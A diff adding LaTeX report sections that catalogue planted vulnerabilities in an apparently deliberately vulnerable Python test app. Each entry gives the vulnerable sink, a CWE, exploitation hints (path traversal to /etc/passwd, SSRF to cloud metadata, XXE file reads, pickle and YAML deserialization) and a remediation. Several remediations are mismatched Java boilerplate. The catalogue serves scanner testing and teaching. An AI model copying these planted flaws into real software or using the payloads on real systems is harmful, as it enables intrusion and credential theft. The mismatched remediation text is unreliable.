+\noindent\textbf{Location:} \texttt{src/vulnapp/file\_network\_vulns.py}, line 17 \quad \textbf{Rule:} \texttt{python/path-traversal} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/22.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+with open(base + filename) as f:
+\end{lstlisting}
+\noindent\textbf{What it is.} Path traversal: user input flows into a file path, letting the attacker escape the intended directory.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Supply `../../../../etc/passwd` (or Windows `..\textbackslash{}..\textbackslash{}`) to read arbitrary files.
+\item Use absolute paths, URL-encoded (`\%2e\%2e\%2f`) or null-byte tricks to bypass naive filters.
+\item Write variant: traverse to overwrite config/startup files to achieve code execution.
+\end{itemize}
+\noindent\textbf{Remediation.} Canonicalize the path and verify it is still under the intended base dir; prefer an allow-list of file ids.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-21: CWE-22: Path Traversal}
+\noindent\textbf{Location:} \texttt{src/vulnapp/file\_network\_vulns.py}, line 23 \quad \textbf{Rule:} \texttt{python/path-traversal} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/22.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+with open(os.path.join("/var/www/uploads/", filename), "w") as f:
+\end{lstlisting}
+\noindent\textbf{What it is.} Path traversal: user input flows into a file path, letting the attacker escape the intended directory.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Supply `../../../../etc/passwd` (or Windows `..\textbackslash{}..\textbackslash{}`) to read arbitrary files.
+\item Use absolute paths, URL-encoded (`\%2e\%2e\%2f`) or null-byte tricks to bypass naive filters.
+\item Write variant: traverse to overwrite config/startup files to achieve code execution.
+\end{itemize}
+\noindent\textbf{Remediation.} Canonicalize the path and verify it is still under the intended base dir; prefer an allow-list of file ids.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-22: CWE-918: Server-Side Request Forgery}
+\noindent\textbf{Location:} \texttt{src/vulnapp/file\_network\_vulns.py}, line 29 \quad \textbf{Rule:} \texttt{python/server-side-request-forgery} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/918.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return urllib.request.urlopen(url).read()
+\end{lstlisting}
+\noindent\textbf{What it is.} Server-Side Request Forgery: server fetches a user-supplied URL.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Point it at internal services (`http://169.254.169.254/`, `http://localhost:admin`) to reach cloud metadata/internal APIs.
+\item Use `file://`/`gopher://` schemes for local file read or protocol smuggling.
+\end{itemize}
+\noindent\textbf{Remediation.} Allow-list destinations, block internal ranges/metadata, disable risky schemes.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-23: CWE-22: Path Traversal}
+\noindent\textbf{Location:} \texttt{src/vulnapp/file\_network\_vulns.py}, line 35 \quad \textbf{Rule:} \texttt{python/path-traversal} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/22.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+tf.extractall(dest)
+\end{lstlisting}
+\noindent\textbf{What it is.} Path traversal: user input flows into a file path, letting the attacker escape the intended directory.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Supply `../../../../etc/passwd` (or Windows `..\textbackslash{}..\textbackslash{}`) to read arbitrary files.
+\item Use absolute paths, URL-encoded (`\%2e\%2e\%2f`) or null-byte tricks to bypass naive filters.
+\item Write variant: traverse to overwrite config/startup files to achieve code execution.
+\end{itemize}
+\noindent\textbf{Remediation.} Canonicalize the path and verify it is still under the intended base dir; prefer an allow-list of file ids.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-24: CWE-377: Insecure Temporary File}
+\noindent\textbf{Location:} \texttt{src/vulnapp/file\_network\_vulns.py}, line 41 \quad \textbf{Rule:} \texttt{python/insecure-temporary-file} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/377.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+path = "/tmp/app_" + str(os.getpid()) + ".tmp"
+\end{lstlisting}
+\noindent\textbf{What it is.} Insecure temporary file creation (predictable name, world-readable).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Predict/pre-create the temp file (symlink) to read/overwrite its contents (race).
+\end{itemize}
+\noindent\textbf{Remediation.} Use Files.createTempFile with secure perms; avoid predictable names.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-25: CWE-732: Incorrect Permission Assignment}
+\noindent\textbf{Location:} \texttt{src/vulnapp/file\_network\_vulns.py}, line 49 \quad \textbf{Rule:} \texttt{python/incorrect-permission-assignment} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/732.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+os.chmod(path, 0o777)
+\end{lstlisting}
+\noindent\textbf{What it is.} Incorrect permission assignment for a critical resource (world-writable/readable).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Any local user reads secrets or overwrites the resource.
+\end{itemize}
+\noindent\textbf{Remediation.} Set least-privilege file/resource permissions (e.g. 600/640).
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-26: CWE-502: Deserialization of Untrusted Data}
+\noindent\textbf{Location:} \texttt{src/vulnapp/file\_network\_vulns.py}, line 54 \quad \textbf{Rule:} \texttt{python/deserialization-of-untrusted-data} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/502.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return pickle.loads(data)
+\end{lstlisting}
+\noindent\textbf{What it is.} Deserialization of untrusted data.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send a crafted serialized object (gadget chain) to achieve RCE on readObject.
+\item Trigger DoS via billion-objects/large graphs.
+\end{itemize}
+\noindent\textbf{Remediation.} Avoid native deserialization of untrusted input; use safe formats (JSON) with allow-lists.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-27: CWE-798: Use of Hard-coded Credentials}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 11 \quad \textbf{Rule:} \texttt{python/use-of-hard-coded-credentials} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/798.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+DB_PASSWORD = "SuperSecret123!"
+\end{lstlisting}
+\noindent\textbf{What it is.} Hard-coded credentials (keys/tokens/passwords) in source.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Extract the secret from the repo/binary and use it directly.
+\end{itemize}
+\noindent\textbf{Remediation.} Externalize secrets to a vault/env; rotate leaked ones.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-28: CWE-798: Use of Hard-coded Credentials}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 13 \quad \textbf{Rule:} \texttt{python/use-of-hard-coded-credentials} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/798.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+AES_KEY = b"0123456789abcdef"
+\end{lstlisting}
+\noindent\textbf{What it is.} Hard-coded credentials (keys/tokens/passwords) in source.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Extract the secret from the repo/binary and use it directly.
+\end{itemize}
+\noindent\textbf{Remediation.} Externalize secrets to a vault/env; rotate leaked ones.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-29: CWE-259: Use of Hard-coded Password}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 15 \quad \textbf{Rule:} \texttt{python/use-of-hard-coded-password} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/259.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+API_TOKEN = "sk_live_51H8xYzABCDEF0123456789"
+\end{lstlisting}
+\noindent\textbf{What it is.} A hard-coded password is embedded in source.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Extract it from the binary/repo and authenticate directly.
+\item The same secret is shared across all deployments and cannot be rotated easily.
+\end{itemize}
+\noindent\textbf{Remediation.} Load secrets from a vault/env; never commit them.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-30: CWE-327: Broken/Risky Cryptographic Algorithm}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 20 \quad \textbf{Rule:} \texttt{python/broken-risky-crypto-algorithm} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/327.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return hashlib.md5(password.encode()).hexdigest()
+\end{lstlisting}
+\noindent\textbf{What it is.} A broken or risky cryptographic algorithm is used (DES, MD5, SHA1, ECB...).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Exploit known weaknesses (collisions, small keyspace, ECB pattern leakage) to forge or decrypt.
+\end{itemize}
+\noindent\textbf{Remediation.} Use vetted primitives: AES-GCM, SHA-256+, HMAC; avoid ECB and legacy ciphers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-31: CWE-327: Broken/Risky Cryptographic Algorithm}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 25 \quad \textbf{Rule:} \texttt{python/broken-risky-crypto-algorithm} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/327.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return hashlib.sha1(data.encode()).hexdigest()
+\end{lstlisting}
+\noindent\textbf{What it is.} A broken or risky cryptographic algorithm is used (DES, MD5, SHA1, ECB...).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Exploit known weaknesses (collisions, small keyspace, ECB pattern leakage) to forge or decrypt.
+\end{itemize}
+\noindent\textbf{Remediation.} Use vetted primitives: AES-GCM, SHA-256+, HMAC; avoid ECB and legacy ciphers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-32: CWE-327: Broken/Risky Cryptographic Algorithm}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 31 \quad \textbf{Rule:} \texttt{python/broken-risky-crypto-algorithm} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/327.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+cipher = DES.new(b"8bytekey", DES.MODE_ECB)
+\end{lstlisting}
+\noindent\textbf{What it is.} A broken or risky cryptographic algorithm is used (DES, MD5, SHA1, ECB...).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Exploit known weaknesses (collisions, small keyspace, ECB pattern leakage) to forge or decrypt.
+\end{itemize}
+\noindent\textbf{Remediation.} Use vetted primitives: AES-GCM, SHA-256+, HMAC; avoid ECB and legacy ciphers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-33: CWE-327: Broken/Risky Cryptographic Algorithm}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 38 \quad \textbf{Rule:} \texttt{python/broken-risky-crypto-algorithm} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/327.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+cipher = AES.new(AES_KEY, AES.MODE_ECB)
+\end{lstlisting}
+\noindent\textbf{What it is.} A broken or risky cryptographic algorithm is used (DES, MD5, SHA1, ECB...).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Exploit known weaknesses (collisions, small keyspace, ECB pattern leakage) to forge or decrypt.
+\end{itemize}
+\noindent\textbf{Remediation.} Use vetted primitives: AES-GCM, SHA-256+, HMAC; avoid ECB and legacy ciphers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-34: CWE-329: Not Using Random IV With CBC}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 46 \quad \textbf{Rule:} \texttt{python/not-using-random-iv-with-cbc} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/329.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+\end{lstlisting}
+\noindent\textbf{What it is.} CBC mode used without a random IV (static/predictable IV).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Detect identical plaintext blocks/messages; chosen-plaintext attacks recover data.
+\end{itemize}
+\noindent\textbf{Remediation.} Use a fresh random IV per message (or authenticated modes like GCM).
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-35: CWE-330: Use of Insufficiently Random Values}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 52 \quad \textbf{Rule:} \texttt{python/insufficiently-random-values} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/330.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return "".join(random.choice("0123456789abcdef") for _ in range(32))
+\end{lstlisting}
+\noindent\textbf{What it is.} Insufficiently random values used where unpredictability is required.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Predict tokens/session ids/nonces generated with java.util.Random.
+\end{itemize}
+\noindent\textbf{Remediation.} Use SecureRandom for all security-sensitive values.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-36: CWE-337: Predictable Seed in PRNG}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 57 \quad \textbf{Rule:} \texttt{python/predictable-seed-in-prng} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/337.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+random.seed(1234)
+\end{lstlisting}
+\noindent\textbf{What it is.} Predictable seed used to initialize a PRNG.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Recompute the seed (e.g. current time) and regenerate all 'random' outputs.
+\end{itemize}
+\noindent\textbf{Remediation.} Never seed with predictable data; use SecureRandom with OS entropy.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-37: CWE-759: Password Hash Without Salt}
+\noindent\textbf{Location:} \texttt{src/vulnapp/crypto\_secret\_vulns.py}, line 63 \quad \textbf{Rule:} \texttt{python/password-hash-without-salt} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/759.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return hashlib.sha256(password.encode()).hexdigest()
+\end{lstlisting}
+\noindent\textbf{What it is.} Password hashed without a salt.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Use rainbow tables / precomputed hashes to crack many passwords instantly.
+\item Identical passwords produce identical hashes, aiding cracking.
+\end{itemize}
+\noindent\textbf{Remediation.} Use per-user salt with a slow KDF (bcrypt/Argon2).
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-38: CWE-306: Missing Authentication for Critical Function}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 17 \quad \textbf{Rule:} \texttt{python/missing-authentication-for-critical-function} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/306.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+db.execute("DELETE FROM users WHERE id=?", (user_id,))
+\end{lstlisting}
+\noindent\textbf{What it is.} A critical function is reachable without authentication.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Call the sensitive endpoint directly with no credentials to perform privileged actions.
+\end{itemize}
+\noindent\textbf{Remediation.} Require authentication/authorization on every sensitive operation.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-39: CWE-639: Authorization Bypass / IDOR}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 23 \quad \textbf{Rule:} \texttt{python/authorization-bypass-idor} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/639.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return db.execute("SELECT body FROM docs WHERE id=?", (doc_id,)).fetchone()
+\end{lstlisting}
+\noindent\textbf{What it is.} Authorization bypass via user-controlled key (IDOR).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Change an id (`/account?id=124`) to access another user's object.
+\item Enumerate ids to scrape all records.
+\end{itemize}
+\noindent\textbf{Remediation.} Check that the current principal owns/may access the referenced object.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-40: CWE-269: Improper Privilege Management}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 28 \quad \textbf{Rule:} \texttt{python/improper-privilege-management} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/269.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+role = request.args.get("role", "user")
+\end{lstlisting}
+\noindent\textbf{What it is.} Improper privilege management grants more rights than needed.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Abuse over-broad privileges to perform actions outside the intended role.
+\item Escalate from a low-priv account to admin operations.
+\end{itemize}
+\noindent\textbf{Remediation.} Enforce least privilege; check authorization per action.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-41: CWE-256: Plaintext Storage of Password}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 34 \quad \textbf{Rule:} \texttt{python/plaintext-storage-of-password} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/256.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+db.execute("INSERT INTO users(name, password) VALUES(?,?)", (username, password))
+\end{lstlisting}
+\noindent\textbf{What it is.} Passwords stored in plaintext.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Any DB/file read (SQLi, backup leak, insider) yields usable credentials directly.
+\item Credential reuse lets the attacker pivot to other services.
+\end{itemize}
+\noindent\textbf{Remediation.} Store only salted, slow password hashes (bcrypt/scrypt/Argon2).
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-42: CWE-326: Inadequate Encryption Strength}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 39 \quad \textbf{Rule:} \texttt{python/inadequate-encryption-strength} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/326.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return base64.b64encode(secret.encode()).decode()
+\end{lstlisting}
+\noindent\textbf{What it is.} Encryption strength is inadequate (short keys / weak parameters).
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Brute-force or cryptanalyze the weak key/parameter to recover plaintext.
+\end{itemize}
+\noindent\textbf{Remediation.} Use modern algorithms and key sizes (AES-256, RSA>=3072/EC).
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-43: CWE-287: Improper Authentication}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 44 \quad \textbf{Rule:} \texttt{python/improper-authentication} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/287.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return {"logged_in_as": request.headers.get("X-User-Id")}
+\end{lstlisting}
+\noindent\textbf{What it is.} Improper authentication: identity is not correctly verified.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Bypass or forge the authentication check to act as another user.
+\item Replay or spoof weak identity tokens.
+\end{itemize}
+\noindent\textbf{Remediation.} Use a vetted auth framework; verify credentials and tokens robustly.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-44: CWE-521: Weak Password Requirements}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 49 \quad \textbf{Rule:} \texttt{python/weak-password-requirements} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/521.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return len(password) >= 0
+\end{lstlisting}
+\noindent\textbf{What it is.} Weak password requirements permit trivial passwords.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Guess/brute-force short or common passwords quickly.
+\end{itemize}
+\noindent\textbf{Remediation.} Enforce length/complexity, block breached passwords, encourage MFA.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-45: CWE-208: Observable Timing Discrepancy}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 54 \quad \textbf{Rule:} \texttt{python/observable-timing-discrepancy} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/208.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return provided == expected
+\end{lstlisting}
+\noindent\textbf{What it is.} Observable timing discrepancy leaks secret-dependent information.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Measure response time of comparisons to recover secrets byte-by-byte (timing side channel).
+\end{itemize}
+\noindent\textbf{Remediation.} Use constant-time comparison (MessageDigest.isEqual) for secrets/HMACs.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-46: CWE-347: Improper Verification of Cryptographic Signature}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 60 \quad \textbf{Rule:} \texttt{python/improper-verification-of-cryptographic-signature} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/347.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return jwt.decode(token, options={"verify_signature": False})
+\end{lstlisting}
+\noindent\textbf{What it is.} Cryptographic signature is not (properly) verified.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Forge or alter signed content (e.g. JWT with `alg:none` or unverified signature).
+\end{itemize}
+\noindent\textbf{Remediation.} Always verify signatures with the expected algorithm and key.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-47: CWE-798: Use of Hard-coded Credentials}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 66 \quad \textbf{Rule:} \texttt{python/use-of-hard-coded-credentials} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/798.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return jwt.encode(payload, "secret", algorithm="HS256")
+\end{lstlisting}
+\noindent\textbf{What it is.} Hard-coded credentials (keys/tokens/passwords) in source.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Extract the secret from the repo/binary and use it directly.
+\end{itemize}
+\noindent\textbf{Remediation.} Externalize secrets to a vault/env; rotate leaked ones.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-48: CWE-307: Improper Restriction of Excessive Auth Attempts}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 71 \quad \textbf{Rule:} \texttt{python/improper-restriction-of-excessive-authentication-attempts} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/307.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return db.execute("SELECT 1 FROM users WHERE name=? AND password=?",
+\end{lstlisting}
+\noindent\textbf{What it is.} No throttling/lockout on repeated authentication attempts.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Brute-force or credential-stuff passwords/OTPs at high rate.
+\end{itemize}
+\noindent\textbf{Remediation.} Rate-limit, add exponential backoff/lockout and CAPTCHA/MFA.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-49: CWE-209: Information Exposure Through Error Message}
+\noindent\textbf{Location:} \texttt{src/vulnapp/auth\_api\_vulns.py}, line 81 \quad \textbf{Rule:} \texttt{python/information-exposure-through-error-message} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/209.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return traceback.format_exc()
+\end{lstlisting}
+\noindent\textbf{What it is.} Error messages expose sensitive internal information.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Trigger exceptions to harvest stack traces, SQL, file paths, framework versions.
+\item Map the attack surface from verbose errors.
+\end{itemize}
+\noindent\textbf{Remediation.} Return generic errors to clients; log details server-side only.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-50: CWE-611: XML External Entity (XXE)}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 20 \quad \textbf{Rule:} \texttt{python/xml-external-entity-xxe} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/611.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return etree.fromstring(xml_bytes, parser)
+\end{lstlisting}
+\noindent\textbf{What it is.} XML External Entity (XXE): XML parser resolves external entities.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Define an entity pointing at `file:///etc/passwd` to read local files.
+\item SSRF via `http://` entities; DoS via billion-laughs entity expansion.
+\end{itemize}
+\noindent\textbf{Remediation.} Disable DTDs/external entities on all XML parsers.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-51: CWE-502: Deserialization of Untrusted Data}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 25 \quad \textbf{Rule:} \texttt{python/deserialization-of-untrusted-data} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/502.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return yaml.load(data, Loader=yaml.Loader)
+\end{lstlisting}
+\noindent\textbf{What it is.} Deserialization of untrusted data.
+
+\noindent\textbf{Exploitation variants.}
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt,topsep=2pt]
+\item Send a crafted serialized object (gadget chain) to achieve RCE on readObject.
+\item Trigger DoS via billion-objects/large graphs.
+\end{itemize}
+\noindent\textbf{Remediation.} Avoid native deserialization of untrusted input; use safe formats (JSON) with allow-lists.
+
+\vspace{4pt}\hrule\vspace{6pt}
+\subsection{VULN-52: CWE-470: Unsafe Reflection}
+\noindent\textbf{Location:} \texttt{src/vulnapp/data\_config\_vulns.py}, line 31 \quad \textbf{Rule:} \texttt{python/unsafe-reflection} \quad \textbf{Severity:} 8.0
+\\ \textbf{Reference:} \url{https://cwe.mitre.org/data/definitions/470.html}
+
+\noindent\textbf{Planted sink:}
+\begin{lstlisting}
+return importlib.import_module(class_name)
+\end{lstlisting}
+\noindent\textbf{What it is.} Unsafe reflection: class/method name comes from user input.
+
+\noindent\textbf{Exploitation variants.}
